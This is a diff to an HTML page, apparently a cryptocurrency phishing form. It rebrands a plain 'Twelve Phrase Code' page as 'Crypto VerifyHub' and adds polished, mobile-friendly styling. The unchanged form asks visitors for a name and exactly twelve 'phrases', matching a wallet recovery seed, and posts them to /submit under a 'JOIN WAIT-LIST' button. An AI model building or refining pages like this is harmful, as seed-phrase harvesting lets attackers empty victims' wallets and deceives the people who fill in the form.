@@ -2,26 +2,107 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title> Twelve Phrase Code</title>
+    <title>Crypto VerifyHub</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { font-family: Arial, sans-serif; background-color: #121212; color: #fff; padding: 20px; }
-        h1 { text-align: center; }
-        form { display: flex; flex-direction: column; max-width: 900px; margin: auto; }
-        .row { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 10px; }
-        .row input { flex: 1 1 calc(33.33% - 10px); padding: 10px; font-size: 16px; }
-        .name-row input { flex: 1 1 100%; padding: 12px; font-size: 18px; margin-bottom: 15px; }
-        button { padding: 12px; font-size: 18px; background-color: #1e88e5; color: #fff; border: none; cursor: pointer; }
-        button:hover { background-color: #1565c0; }
-        p.note { text-align: center; margin-bottom: 20px; font-style: italic; }
+        /* Body & General */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: #fff;
+            margin: 0;
+            padding: 20px;
+        }
+
+        h1 {
+            text-align: center;
+            margin-bottom: 10px;
+            font-size: 2em;
+            color: #1e88e5;
+        }
+
+        p.note {
+            text-align: center;
+            margin-bottom: 25px;
+            font-style: italic;
+            color: #bbb;
+        }
+
+        /* Form Styling */
+        form {
+            display: flex;
+            flex-direction: column;
+            max-width: 900px;
+            margin: auto;
+            gap: 15px;
+        }
+
+        .name-row input {
+            width: 100%;
+            padding: 14px;
+            font-size: 18px;
+            border-radius: 8px;
+            border: none;
+            background-color: #1e1e1e;
+            color: #fff;
+        }
+
+        .row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .row input {
+            flex: 1 1 calc(33.33% - 15px);
+            padding: 12px;
+            font-size: 16px;
+            border-radius: 8px;
+            border: none;
+            background-color: #1e1e1e;
+            color: #fff;
+        }
+
+        button {
+            padding: 15px;
+            font-size: 18px;
+            background-color: #1e88e5;
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        button:hover {
+            background-color: #1565c0;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            .row input {
+                flex: 1 1 calc(50% - 15px);
+            }
+        }
+
+        @media (max-width: 480px) {
+            .row input {
+                flex: 1 1 100%;
+            }
+        }
     </style>
 </head>
 <body>
-    <h1>Test Phrases</h1>
-    <p class="note">input exactly 12 phrases.</p>
+    <h1>Twelve Phrases</h1>
+    <p class="note">Please input exactly 12 .</p>
+
     <form action="/submit" method="POST">
+        <!-- Name field -->
         <div class="name-row">
             <input type="text" name="name" placeholder="Your Name" required>
         </div>
+
+        <!-- 12 Phrases -->
         <div class="row">
             <input type="text" name="code1" placeholder="Phrase 1" required>
             <input type="text" name="code2" placeholder="Phrase 2" required>
@@ -42,6 +123,7 @@
             <input type="text" name="code11" placeholder="Phrase 11" required>
             <input type="text" name="code12" placeholder="Phrase 12" required>
         </div>
+
         <button type="submit">JOIN WAIT-LIST</button>
     </form>
 </body>
